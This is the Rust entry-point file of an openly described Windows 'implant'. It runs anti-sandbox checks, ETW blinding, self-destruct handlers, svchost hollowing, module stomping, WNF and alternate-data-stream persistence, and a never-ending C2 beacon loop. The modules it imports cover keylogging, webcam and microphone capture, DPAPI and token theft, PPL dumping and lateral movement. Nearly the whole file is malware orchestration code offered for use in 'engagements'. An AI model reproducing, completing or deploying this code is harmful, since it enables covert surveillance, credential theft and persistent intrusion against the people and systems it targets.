//! main.rs — Implant entry point
//!
//! Boot sequence:
//!   1. Anti-analysis checks (bail out if sandbox detected)
//!   2. ETW blind
//!   3. Ctrl handler + VEH installation
//!   4. Guardian thread launch
//!   5. Watchdog thread (obfuscated sleep cycle)
//!   6. Module stomp
//!   7. WNF persistence channel
//!   8. C2 beacon loop (never returns)

#![allow(non_snake_case, dead_code)]
#![windows_subsystem = "windows"]

mod antidetect;
mod c2;
mod defs;
mod dpapi;
mod etw_patch;
mod guardian;
mod hashes;
mod hollow;
mod indirect_syscall;
mod keylog;
mod lateral;
mod loader;
mod pe_obfuscate;
mod persist;
mod post_shutdown;
mod ppldump;
mod resurrect;
mod sac_bypass;
mod screenshot;
mod selfdestruct;
mod sleep;
mod spoof;
mod stomp;
mod syscall;
mod threadless_inject;
mod token;
mod unhook;
mod utils;
mod watchdog;
mod filetransfer;
mod mic;
mod webcam;

#[cfg(feature = "ssn-audit")]
mod ssn_audit;

/// Shared XOR key: used by sleep.rs obfuscator and resurrect.rs ADS decrypt.
/// Change before each engagement.
pub static SLEEP_KEY: [u8; 16] = [
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
    0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF,
];

fn main() {
    unsafe { run() }
}

unsafe fn run() -> ! {
    // 1. Sandbox / anti-analysis gate
    if antidetect::all_checks() {
        winapi::um::processthreadsapi::TerminateProcess(
            winapi::um::processthreadsapi::GetCurrentProcess(),
            0,
        );
        loop {}
    }

    // 2. ETW blind
    etw_patch::apply_all_blinds();

    // 3. Ctrl handler + VEH
    selfdestruct::register_ctrl_handler();
    let fn_add_veh = indirect_syscall::resolve_add_veh();
    // install_veh now takes (fn_add_veh, fn_destruct) — pass full_destruct
    // so the VEH handler calls our proper wipe+terminate path.
    guardian::install_veh(fn_add_veh, selfdestruct::full_destruct);

    // 4. Guardian thread
    let fn_ntqsi    = indirect_syscall::resolve_ntqsi();
    let fn_sleep_ms = indirect_syscall::resolve_sleep();
    let fn_tick     = indirect_syscall::resolve_tick();

    guardian::start_thread(
        fn_ntqsi,
        fn_sleep_ms,
        fn_tick,
        selfdestruct::wipe_self,
        persist::purge_all,
        resurrect::drop_from_ads,
        persist::install_all,
        hollow::inject_svchost,
    );

    // 5. Watchdog thread (obfuscated sleep / beacon-health monitor)
    watchdog::start(&SLEEP_KEY);

    // 6. Module stomp
    // stomp::stomp signature: (decoy_dll: &[u16], spoof_name: &[u16],
    //                           spoof_path: &[u16], payload: &[u8])
    // The fn internally uses a hardcoded decoy (xpsservices.dll); the
    // first three &[u16] args are accepted but ignored.
    // Pass empty slices — operator supplies real payload via C2.
    stomp::stomp(&[], &[], &[], &[]);

    // 7. WNF persistence channel
    post_shutdown::install_wnf_channel(
        0x41C64E6D_u64,
        &[],
        &SLEEP_KEY,
        true,
        true,
        "C:\\Windows\\System32\\en-US\\shell32.dll",
        0x4352_4344_u32,
    );

    // 8. C2 beacon loop (never returns)
    c2::run()
}
